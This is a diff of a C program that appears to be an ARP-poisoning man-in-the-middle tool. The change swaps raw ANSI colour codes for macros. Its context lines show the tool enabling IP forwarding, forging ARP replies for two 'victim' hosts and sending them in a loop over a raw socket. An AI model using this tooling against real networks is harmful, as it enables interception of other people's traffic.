@@ -44,19 +44,19 @@ int timing = 0;
 
 void title() // good old ASCII art...
 {
-  printf("\n\033[1;32m");
+  printf("\n" GREEN);
   printf("\t%s\n", "-------------------------------------------------");
   printf("\t%s\n", " ###   ##    ##");
-  printf("\033[1;33m");
+  printf(YELLOW);
   printf("\t%s\n", "#   # #  #  #  #        ###                *   **");
-  printf("\033[1;31m");
+  printf(RED);
   printf("\t%s\n", "# # # # #   # #  ##  # # #   ##  ##  #    **  *  *");
-  printf("\033[1;33m");
+  printf(YELLOW);
   printf("\t%s\n", "#   # #  #  #   #  # #    # #  # # # #   * *  *  *");
-  printf("\033[1;32m");
+  printf(GREEN);
   printf("\t%s\n", "#   # #   # #    ##  # ###   ##  #  ## ==  * . **");
   printf("\t%s\n", "-------------------------------------------------");
-  printf("\033[0m\n");
+  printf(RESET "\n");
 }
 
 void print_syntax(char *name) {
@@ -78,7 +78,7 @@ void print_syntax(char *name) {
   state
 */
 void ip_forward(int on_off) {
-  printf("[\033[1;33mInit\033[0m]: Checking kernel IP_FORWARD status\n");
+  printf("[" YELLOW "Init" RESET "]: Checking kernel IP_FORWARD status\n");
 
   int ip_f = platform_get_ip_forward();
   if (ip_f < 0) {
@@ -87,24 +87,24 @@ void ip_forward(int on_off) {
 
   if (on_off == 1) {
     if (ip_f == 0) {
-      printf("[\033[1;33mCore\033[0m]: kernel ip_forward disabled...\n");
-      printf("[\033[1;33mCore\033[0m]: Enabling kernel IP_FORWARD...\n");
+      printf("[" YELLOW "Core" RESET "]: kernel ip_forward disabled...\n");
+      printf("[" YELLOW "Core" RESET "]: Enabling kernel IP_FORWARD...\n");
       if (platform_set_ip_forward(1) < 0) {
         die("Failed to enable IP forwarding.\n");
       }
-      printf("[\033[1;33mCore\033[0m]: kernel ip_forward ENABLED\n");
+      printf("[" YELLOW "Core" RESET "]: kernel ip_forward ENABLED\n");
     } else {
-      printf("[\033[1;33mCore\033[0m]: kernel ip_forward = %d (ENABLED)\n",
+      printf("[" YELLOW "Core" RESET "]: kernel ip_forward = %d (ENABLED)\n",
              ip_f);
     }
   } else {
     if (ip_f == 1) {
-      printf("[\033[1;33mCore\033[0m]: kernel ip_forward enabled...\n");
-      printf("[\033[1;33mCore\033[0m]: Disabling kernel IP_FORWARD...\n");
+      printf("[" YELLOW "Core" RESET "]: kernel ip_forward enabled...\n");
+      printf("[" YELLOW "Core" RESET "]: Disabling kernel IP_FORWARD...\n");
       if (platform_set_ip_forward(0) < 0) {
         die("Failed to disable IP forwarding.\n");
       }
-      printf("[\033[1;33mCore\033[0m]: kernel ip_forward DISABLED\n");
+      printf("[" YELLOW "Core" RESET "]: kernel ip_forward DISABLED\n");
     }
   }
 }
@@ -112,15 +112,15 @@ void ip_forward(int on_off) {
 void program_init(char *IP, char *IP2) {
   //  Retrieving ARP address of the victim  hosts
   printf("\n");
-  printf("[\033[1;33mInit\033[0m]: Searching MAC for HOST: "
-         "\033[1;34m{%s}\033[0m\n",
+  printf("[" YELLOW "Init" RESET "]: Searching MAC for HOST: "
+         BLUE "{%s}" RESET "\n",
          IP);
   //  sometimes arp resolution is flaky.. make 3 requests just in case
   force_arp(inet_addr(IP));
   force_arp(inet_addr(IP));
   force_arp(inet_addr(IP));
-  printf("[\033[1;33mInit\033[0m]: Searching MAC for HOST: "
-         "\033[1;34m{%s}\033[0m\n",
+  printf("[" YELLOW "Init" RESET "]: Searching MAC for HOST: "
+         BLUE "{%s}" RESET "\n",
          IP2);
   //  Idem
   force_arp(inet_addr(IP2));
@@ -134,10 +134,10 @@ void program_init(char *IP, char *IP2) {
  * exit signal hijacker
  */
 void sig_exit(int sig) {
-  printf("\033[1;31m");
+  printf(RED);
   printf("\n[Core]: SIGNAL RECEIVED (timestamp %s): Shutting down...\n",
          getTimestamp());
-  printf("\033[0m");
+  printf(RESET);
   /*if (ip2 != NULL)
   {
     free(ip2);
@@ -155,20 +155,20 @@ void sig_exit(int sig) {
   }
   platform_close_raw(arp_socket);
   ip_forward(0);
-  printf("\033[1;34m");
+  printf(BLUE);
   printf("Cleanup completed, shutting down...\n");
-  printf("\033[0m");
+  printf(RESET);
 
   exit(-1);
 }
 
 //  Segmentation fault action handler
 void segv_handler(int sig) {
-  printf("\033[1;31m");
+  printf(RED);
   printf("\n[Core]: [.::APPLICATION SUICIDE::.] GOT SIGSEGV [segmentation "
          "fault] (timestamp %s)\n",
          getTimestamp());
-  printf("\033[0m");
+  printf(RESET);
   /*if (ip2 != NULL)
   {
     free(ip2);
@@ -188,11 +188,11 @@ void segv_handler(int sig) {
     platform_close_raw(arp_socket);
 
   ip_forward(0);
-  printf("\033[1;34m");
-  printf("\033[0m");
-  printf("\033[1;34m");
+  printf(BLUE);
+  printf(RESET);
+  printf(BLUE);
   printf("Unexpected program failure. Shutdown completed.\n");
-  printf("\033[0m");
+  printf(RESET);
   sleep(1);
 
   exit(-1);
@@ -210,7 +210,7 @@ int main(int argc, char **argv) {
   int mode = 0;
 
   if (getuid() != 0) {
-    printf("\n[\033[1;33mCore\033[0m]: Cannot start up the program: You need "
+    printf("\n[" YELLOW "Core" RESET "]: Cannot start up the program: You need "
            "ROOT privileges. (timestamp: %s)\n\n",
            getTimestamp());
     exit(-1);
@@ -242,14 +242,14 @@ int main(int argc, char **argv) {
 
   printf("[+] Options: timing %d secs, interface %s.\n", timing, interface);
   if (mode) {
-    printf("%s\n", "[\033[1;33mCore\033[0m]: Hijacking signal handlers...");
+    printf("%s\n", "[" YELLOW "Core" RESET "]: Hijacking signal handlers...");
     signal(SIGINT, sig_exit);
     signal(SIGTERM, sig_exit);
     signal(SIGKILL, sig_exit);
     signal(SIGHUP, sig_exit);
 
     printf("%s\n",
-           "[\033[1;33mCore\033[0m]: Registering signal action for SIGSEGV...");
+           "[" YELLOW "Core" RESET "]: Registering signal action for SIGSEGV...");
     sigaction(SIGSEGV, &sa, NULL);
 
     printf("[+] OP Mode: GRATUITOUS ARP MODE\n");
@@ -266,8 +266,8 @@ int main(int argc, char **argv) {
 
     // build up descriptor for the gratuitous arp packet...
     gratuitous_arp = new_nic_info_t(newIP, newMAC);
-    printf("[\033[1;33mCore\033[0m]: New IP: \033[1;34m{%s}\033[0m - New MAC: "
-           "\033[1;34m{%s}\033[0m...\n",
+    printf("[" YELLOW "Core" RESET "]: New IP: " BLUE "{%s}" RESET " - New MAC: "
+           BLUE "{%s}" RESET "...\n",
            smart_IP_to_char(ntohl(gratuitous_arp->ip_address)),
            gratuitous_arp->mac_address_string);
 
@@ -289,11 +289,11 @@ int main(int argc, char **argv) {
     me = get_hw_addr(interface);
 
     // build gratuitous arp packet...
-    printf("[\033[1;33mCore\033[0m]: NEW IP \033[1;34m{%s}\033[0m is-at "
-           "\033[1;34m{%s}\033[0m...\n",
+    printf("[" YELLOW "Core" RESET "]: NEW IP " BLUE "{%s}" RESET " is-at "
+           BLUE "{%s}" RESET "...\n",
            smart_IP_to_char(ntohl(gratuitous_arp->ip_address)),
            gratuitous_arp->mac_address_string);
-    printf("[\033[1;33mCore\033[0m]: Generating Ethernet Frame and ARP packet "
+    printf("[" YELLOW "Core" RESET "]: Generating Ethernet Frame and ARP packet "
            "for New Host...\n");
     u_char packet_IP1[60];
     memset(packet_IP1, 0, 60);
@@ -311,30 +311,30 @@ int main(int argc, char **argv) {
     free(me);
 
     // open socket
-    printf("[\033[1;33mCore\033[0m]: Opening raw packet socket...\n");
+    printf("[" YELLOW "Core" RESET "]: Opening raw packet socket...\n");
     arp_socket = platform_open_raw_socket(interface);
 
     if (arp_socket < 0) {
       printf(
-          "\n[\033[1;33mCore\033[0m]: \033[1;31mSOCKET INIT ERROR!!\033[0m\n");
+          "\n[" YELLOW "Core" RESET "]: " RED "SOCKET INIT ERROR!!" RESET "\n");
       raise(SIGTERM);
     }
 
-    printf("\n[\033[1;33mCore\033[0m]: \033[1;31mGRATUITOUS ARP INIT\033[0m\n");
+    printf("\n[" YELLOW "Core" RESET "]: " RED "GRATUITOUS ARP INIT" RESET "\n");
 
     // send 3 packets...
     for (int arps = 0; arps < 3; arps++) // ARP update loop
     {
       // Send packet
-      printf("[\033[1;33mCore\033[0m]: ARP-updating(%d): \033[1;34m{%s}\033[0m "
-             "<----> \033[1;34m{%s}\033[0m, target MAC is {%s}\n",
+      printf("[" YELLOW "Core" RESET "]: ARP-updating(%d): " BLUE "{%s}" RESET " "
+             "<----> " BLUE "{%s}" RESET ", target MAC is {%s}\n",
              arps, newIP, gratuitous_arp->mac_address_string,
              temp_str->mac_address_string);
       i = platform_send_raw(arp_socket, packet_IP1, sizeof(packet_IP1),
                             interface);
 
       if (i != sizeof(packet_IP1)) {
-        printf("[\033[1;33mCore\033[0m]: Error writing to the socket. "
+        printf("[" YELLOW "Core" RESET "]: Error writing to the socket. "
                "(arp_socket)\n");
         raise(SIGTERM);
       }
@@ -346,20 +346,20 @@ int main(int argc, char **argv) {
     raise(SIGTERM);
 
   } else {
-    printf("%s\n", "[\033[1;33mCore\033[0m]: Hijacking signal handlers...");
+    printf("%s\n", "[" YELLOW "Core" RESET "]: Hijacking signal handlers...");
     signal(SIGINT, sig_exit);
     signal(SIGTERM, sig_exit);
     signal(SIGKILL, sig_exit);
     signal(SIGHUP, sig_exit);
 
     printf("%s\n",
-           "[\033[1;33mCore\033[0m]: Registering signal action for SIGSEGV...");
+           "[" YELLOW "Core" RESET "]: Registering signal action for SIGSEGV...");
     sigaction(SIGSEGV, &sa, NULL);
 
     printf("[+] OP Mode: ARP POISON\n");
     timing = timing / 1000;
     if (timing < 1) {
-      printf("[\033[1;33mCore\033[0m]: Cannot handle timings lower than 2000 "
+      printf("[" YELLOW "Core" RESET "]: Cannot handle timings lower than 2000 "
              "msec, setting default\n");
       timing = TIMING_DEFAULT;
     }
@@ -379,27 +379,27 @@ int main(int argc, char **argv) {
     victim_2 = (nic_info_t *)malloc(sizeof(nic_info_t));
 
     //  OK, fire things up
-    printf("[\033[1;33mCore\033[0m]: Application Startup (timestamp: %s)\n",
+    printf("[" YELLOW "Core" RESET "]: Application Startup (timestamp: %s)\n",
            getTimestamp());
 
-    printf("%s\n", "[\033[1;33mCore\033[0m]: Gathering network infos ...");
+    printf("%s\n", "[" YELLOW "Core" RESET "]: Gathering network infos ...");
     program_init(ip1, ip2);
 
     printf("%s\n",
-           "\n[\033[1;33mCore\033[0m]: Generating nic_info_t strutures...");
+           "\n[" YELLOW "Core" RESET "]: Generating nic_info_t strutures...");
     me = get_hw_addr(interface);
 
     if (me == NULL) {
-      printf("[\033[1;35mCore\033[0m] Error gathering info from device [%s].\n",
+      printf("[" PURPLE "Core" RESET "] Error gathering info from device [%s].\n",
              interface);
-      printf("[\033[1;35mCore\033[0m] [%s]: this basically can mean anything, "
+      printf("[" PURPLE "Core" RESET "] [%s]: this basically can mean anything, "
              "from a mistyped name to an interface in DOWN state.\n",
              interface);
       raise(SIGTERM);
     }
 
-    printf("[\033[1;33mCore\033[0m]: Local IP: \033[1;34m{%s}\033[0m - Local "
-           "MAC: \033[1;34m{%s}\033[0m...\n",
+    printf("[" YELLOW "Core" RESET "]: Local IP: " BLUE "{%s}" RESET " - Local "
+           "MAC: " BLUE "{%s}" RESET "...\n",
            smart_IP_to_char(ntohl(me->ip_address)), me->mac_address_string);
 
     // gathering infos on host 1
@@ -439,11 +439,11 @@ int main(int argc, char **argv) {
     temp_str = NULL;
 
     //  Generating the EvIl packet for host 1
-    printf("[\033[1;33mCore\033[0m]: IP \033[1;34m{%s}\033[0m is-at "
-           "\033[1;34m{%s}\033[0m...\n",
+    printf("[" YELLOW "Core" RESET "]: IP " BLUE "{%s}" RESET " is-at "
+           BLUE "{%s}" RESET "...\n",
            smart_IP_to_char(ntohl(victim_1->ip_address)),
            victim_1->mac_address_string);
-    printf("[\033[1;33mCore\033[0m]: Generating Ethernet Frame and ARP packet "
+    printf("[" YELLOW "Core" RESET "]: Generating Ethernet Frame and ARP packet "
            "for host 1...\n");
     u_char packet_IP1[60];
     memset(packet_IP1, 0, 60);
@@ -472,11 +472,11 @@ int main(int argc, char **argv) {
                 (unsigned char *)(packet_cleanup1 + ETH_H));
 
     // forging packet for host 2
-    printf("[\033[1;33mCore\033[0m]: IP \033[1;34m{%s}\033[0m is-at "
-           "\033[1;34m{%s}\033[0m...\n",
+    printf("[" YELLOW "Core" RESET "]: IP " BLUE "{%s}" RESET " is-at "
+           BLUE "{%s}" RESET "...\n",
            smart_IP_to_char(ntohl(victim_2->ip_address)),
            victim_2->mac_address_string);
-    printf("[\033[1;33mCore\033[0m]: Generating Ethernet Frame and ARP packet "
+    printf("[" YELLOW "Core" RESET "]: Generating Ethernet Frame and ARP packet "
            "for host 2...\n");
     u_char packet_IP2[60];
     memset(packet_IP2, 0, 60);
@@ -503,22 +503,22 @@ int main(int argc, char **argv) {
                 (unsigned char *)&victim_1->ip_address, ARPOP_REPLY,
                 (unsigned char *)(packet_cleanup2 + ETH_H));
 
-    printf("[\033[1;33mCore\033[0m]: Opening raw packet socket...\n");
+    printf("[" YELLOW "Core" RESET "]: Opening raw packet socket...\n");
     arp_socket = platform_open_raw_socket(interface);
 
     if (arp_socket < 0) {
       printf(
-          "\n[\033[1;33mCore\033[0m]: \033[1;31mSOCKET INIT ERROR!!\033[0m\n");
+          "\n[" YELLOW "Core" RESET "]: " RED "SOCKET INIT ERROR!!" RESET "\n");
       raise(SIGTERM);
     }
 
     printf(
-        "\n[\033[1;33mCore\033[0m]: \033[1;31mMAN IN THE MIDDLE INIT\033[0m\n");
-    printf("[\033[1;33mCore\033[0m]: ARP-fooling: \033[1;34m{%s}\033[0m <----> "
-           "\033[1;34m{%s}\033[0m <----> \033[1;34m{%s}\033[0m\n",
+        "\n[" YELLOW "Core" RESET "]: " RED "MAN IN THE MIDDLE INIT" RESET "\n");
+    printf("[" YELLOW "Core" RESET "]: ARP-fooling: " BLUE "{%s}" RESET " <----> "
+           BLUE "{%s}" RESET " <----> " BLUE "{%s}" RESET "\n",
            ip1, smart_IP_to_char(ntohl(me->ip_address)), ip2);
-    printf("[\033[1;33mCore\033[0m]: ARP-fooling: \033[1;34m{%s}\033[0m <----> "
-           "\033[1;34m{%s}\033[0m <----> \033[1;34m{%s}\033[0m\n",
+    printf("[" YELLOW "Core" RESET "]: ARP-fooling: " BLUE "{%s}" RESET " <----> "
+           BLUE "{%s}" RESET " <----> " BLUE "{%s}" RESET "\n",
            victim_1->mac_address_string, me->mac_address_string,
            victim_2->mac_address_string);
 
@@ -539,7 +539,7 @@ int main(int argc, char **argv) {
                             interface);
 
       if (i != sizeof(packet_IP1)) {
-        printf("[\033[1;33mCore\033[0m]: Error writing to the socket!!! (1)\n");
+        printf("[" YELLOW "Core" RESET "]: Error writing to the socket!!! (1)\n");
         raise(SIGTERM);
       }
 
@@ -553,7 +553,7 @@ int main(int argc, char **argv) {
                             interface);
 
       if (i != sizeof(packet_IP2)) {
-        printf("[\033[1;33mCore\033[0m]: Error writing to the socket!!! (1)\n");
+        printf("[" YELLOW "Core" RESET "]: Error writing to the socket!!! (1)\n");
         raise(SIGTERM);
       }
 
